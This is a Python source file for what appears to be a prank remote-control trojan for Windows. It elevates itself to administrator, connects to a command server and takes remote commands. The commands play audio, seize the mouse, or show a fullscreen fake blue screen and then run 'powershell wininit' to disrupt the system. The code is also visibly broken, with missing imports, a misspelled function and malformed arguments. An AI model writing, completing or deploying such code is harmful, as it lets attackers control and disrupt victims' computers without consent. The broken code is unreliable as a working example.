import socket
import pygame
import time
import win32api, win32con
import threading
import math
import os
import ctypes

#Initilizing things
ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # Runs as admin
pygame.mixer.init()
addr = "127.0.0.1"
port = 4560

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((addr, port))


def playAudio(audiopath = None, stopAudio = True):
    if stopAudio == False:
        pygame.mixer.music.load(audiopath)
        pygame.mixer.music.play()
    else:
        pygame.mixer.music.stop()

def returnmsg(msg):
    server.send(bytes(msg, "utf-8"))

def MoveMouse(x, y):
    x2 = 0
    y2 = 0

    nativeScreenSize = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
    screenx = int(nativeScreenSize[0] / 2)
    screeny = int(nativeScreenSize[1] / 2)

    print(f'{nativeScreenSize[0]} {nativeScreenSize[1]} {screenx} {screeny}')

    win32api.SetCursorPos((screenx, screeny)) #This doesnt work for games

    while x2 < x:
        x2 = x2 + 16
        y2 = y2 + 9
        time.sleep(0.01)
        print(f'CursorX: {x2} CursorY: {y2}')
        win32api.SetCursorPos((x2, y2))

def bsod(videopath, waittime):
    pygame.init()
    DISPLAYSURF = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    movie = pygame.movie.Movie(videopath)
    movie_screen = pygame.Surface(movie.get_size()).convert()
    movie.set_display(movie_screen)  
    movie.play()
    time.sleep(waittime)
    os.system('powershell wininit')

def returnScreenRes():
    res = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
    return res

def parse(args):
    if args[0] == "audio":
        if args[1] == "false":
            playAudio(False)
        else:
            playAudio(args[1])
    if args[0] == "mm":
        MoveMouse(int(args[1]), int([2]))
    if args[0] == "mmr":
        moseMouse(int(random.random(returnScreenRes[0])), int(random.random(returnScreenRes[1])))
    if args[0] == "bsod":
        bsod(args[1], args[2])
    if args[0] == "exit":
        exit()

try:
    
    while True:
        buffer = server.recv(1024)
        buffer = buffer.decode("utf-8")

        splitargs = buffer.split()
        print(splitargs)

        parse(splitargs)
except:
    print("BRUH")

'''
    if buffer == "music":
        PlayMusic()

    if buffer == "music stop":
        StopMusic()

    if buffer == "stop":
        exit()
'''
